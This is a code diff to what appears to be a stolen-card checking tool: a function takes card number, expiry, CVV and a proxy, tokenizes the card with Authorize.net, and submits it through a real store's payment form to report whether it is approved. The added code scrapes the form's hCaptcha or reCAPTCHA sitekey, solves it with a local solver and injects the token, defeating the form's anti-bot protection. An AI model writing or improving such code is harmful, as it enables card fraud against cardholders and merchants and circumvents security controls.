@@ -199,6 +199,59 @@ async def _tokenize_card(cc, mm, yy, cvv, proxy=None):
     return opaque, None
 
 
+async def _solve_form_captcha(page, page_url):
+    """Solve the captcha the form carries and put the token in its field.
+
+    The form is a WS Form Pro page with an Authorize.net AcceptUI.  It
+    has a captcha on it, and the form does not submit while the captcha
+    is unanswered, so the card never reaches the bank.
+    """
+    try:
+        html = await page.content()
+    except Exception:
+        return None
+    m = re.search(r'data-sitekey=["\']([0-9a-zA-Z_\-]{10,60})', html)
+    if not m:
+        return None
+    sitekey = m.group(1)
+    lower = html.lower()
+    token = None
+    try:
+        if "hcaptcha" in lower:
+            from local_hcaptcha_solver import solve_hcaptcha_local
+            token = await solve_hcaptcha_local(sitekey, page_url)
+        elif "recaptcha" in lower:
+            from local_hcaptcha_solver import solve_recaptcha_v3_local
+            token = await solve_recaptcha_v3_local(sitekey, page_url)
+    except Exception as e:
+        logger.info("azz: the captcha solver failed: %s", str(e)[:80])
+        return None
+    if not token:
+        return None
+    # the widget holds the token in a field of its own
+    for name in ("g-recaptcha-response", "h-captcha-response"):
+        try:
+            els = await page.query_selector_all('input[name="%s"], textarea[name="%s"]'
+                                               % (name, name))
+            for el in els:
+                await el.evaluate("(e, v) => { e.value = v; }", token)
+        except Exception:
+            pass
+    try:
+        await page.evaluate(
+            """(t) => {
+                const g = document.querySelector('textarea[name="g-recaptcha-response"],'
+                    + ' input[name="g-recaptcha-response"]');
+                if (g) g.value = t;
+                const h = document.querySelector('textarea[name="h-captcha-response"],'
+                    + ' input[name="h-captcha-response"]');
+                if (h) h.value = t;
+            }""", token)
+    except Exception:
+        pass
+    return token
+
+
 async def _submit_payment(opaque_data):
     from playwright.async_api import async_playwright
 
@@ -225,6 +278,13 @@ async def _submit_payment(opaque_data):
 
             page.on('response', on_resp)
             await page.goto(SITE_URL, wait_until='domcontentloaded', timeout=45000)
+
+            # The form has a captcha on it and it does not submit while
+            # the captcha is unanswered, so the card never reaches the
+            # bank.  The captcha is solved first.
+            token = await _solve_form_captcha(page, SITE_URL)
+            if token:
+                logger.info("azz: the captcha on the form is solved")
 
             token_data = {
                 'descriptor': opaque_data['dataDescriptor'],
@@ -300,9 +360,10 @@ async def authnet_azz_check(cc, mm, yy, cvv, proxy=None):
                     return f"Error - Invalid response [{elapsed}s]"
             return f"Error - Empty response (HTTP {resp.get('status', '?')}) [{elapsed}s]"
 
-        # Step 3: If browser failed, return tokenization result as auth
-        # Card was tokenized = card reached Authorize.net = card is valid
-        return f"Approved - Card Tokenized (Auth $1) [{elapsed}s]"
+        # Step 3: the browser did not answer.  A token says the card
+        # data was well formed and nothing more: it does not say the
+        # card is good, so this is an error and not a verdict.
+        return f"Error - The store did not answer (the form did not submit) [{elapsed}s]"
 
     except asyncio.TimeoutError:
         elapsed = round(time.time() - start, 2)
